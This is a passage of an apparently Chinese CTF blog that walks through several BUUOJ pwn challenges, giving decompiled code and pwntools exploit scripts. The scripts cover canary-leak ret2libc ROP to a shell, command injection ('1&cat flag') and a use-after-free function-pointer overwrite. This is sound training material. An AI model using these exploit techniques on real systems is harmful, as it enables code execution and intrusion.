class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babyrop2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26953</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;canary--&gt;&quot;</span>,canary)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x20</span> -<span class="number">8</span>) +p64(canary) + p64(<span class="number">123</span>) + p64(pop_rdi_ret) + p64(puts_got)+p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;story!\n&quot;</span>,payload)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts--&gt;&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x18</span>) +p64(canary) + p64(<span class="number">0</span>) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x24-jarvisoj-test-your-memory"><a href="#0x24-jarvisoj-test-your-memory" class="headerlink" title="0x24.jarvisoj_test_your_memory"></a>0x24.jarvisoj_test_your_memory</h2><p>看了看题目，以为会很难，，，，结果其实很简单，就是个简单的栈题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">11</span>]; <span class="comment">// [esp+1Dh] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">10</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n------Test Your Memory!-------\n&quot;</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">    s2[i] = alphanum_2626[rand() % <span class="number">0x3E</span>u];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">  mem_test(s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">mem_test</span><span class="params">(<span class="keyword">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">19</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xB</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nwhat???? : &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x%x \n&quot;</span>, hint);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;cff flag go go go ...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s, s2, <span class="number">4u</span>) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;good job!!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;cff flag is failed!!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./memory&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27913</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">cat_flag = <span class="number">0x080487E0</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recvuntil(&quot;&gt; &quot;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x13</span>+<span class="number">4</span>) + p32(system)+p32(main) + p32(cat_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x25-bjdctf-2020-router"><a href="#0x25-bjdctf-2020-router" class="headerlink" title="0x25.bjdctf_2020_router"></a>0x25.bjdctf_2020_router</h2><p>emmm….这题怎么说呢看了半天，结果算是个脑洞题吧，就linux命令拼接。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+34h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">56</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  *(_QWORD *)dest = <span class="string">&#x27; gnip&#x27;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to BJDCTF router test program! &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input u choose:&quot;</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// ping</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input the ip address:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// test</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bibibibbibibib~~~&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ziziizzizi~~~&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;something wrong!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Test done!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// leave comments</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input what u want to say&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your suggest will help us to do better!&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v10, <span class="number">0x3A</span>uLL);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dear ctfer,your suggest is :%s&quot;</span>, v10);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:                                   <span class="comment">// root</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Hey guys,u think too much!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Good Bye!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Functional development!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_router&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28235</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&amp;cat flag&quot;</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="0x26-hitcontraining-uaf"><a href="#0x26-hitcontraining-uaf" class="headerlink" title="0x26.hitcontraining_uaf"></a>0x26.hitcontraining_uaf</h2><p>一开始总是指针偏移的形式展示notelist，按y然后char * 或者char**就可以数组显示了。(int也可)</p><p>add:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> **<span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> **v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;notelist)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;notelist)[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;notelist)[i] = print_note_content;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = (&amp;notelist)[i];</span><br><span class="line">      v1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (&amp;notelist)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> ++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add中首先malloc了8，分别存放print_note_content和content的地址。</p><p>print:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> **<span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = (*(&amp;notelist)[v2])((&amp;notelist)[v2]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印print_note_content((&amp;notelist)[v2])。</p><p>delete：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2][<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2]);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>del只是free并没有把指针置空，存在uaf</p><p>后面还有个后门函数magic</p><p>思路：</p><ul><li>  先创建两个，然后delete掉</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x923a038 —▸ 0x923a000 ◂— 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x923a048 —▸ 0x923a010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>  之后创建一个，往里面写magic的地址就OK</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x923a048 —▸ 0x923a010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./hacknote&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29112</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">magic_addr=elf.symbols[<span class="string">&#x27;magic&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Success !&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">add_note(<span class="number">0x20</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add_note(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x27-picoctf-2018-buffer-overflow-1"><a href="#0x27-picoctf-2018-buffer-overflow-1" class="headerlink" title="0x27.picoctf_2018_buffer overflow 1"></a>0x27.picoctf_2018_buffer overflow 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 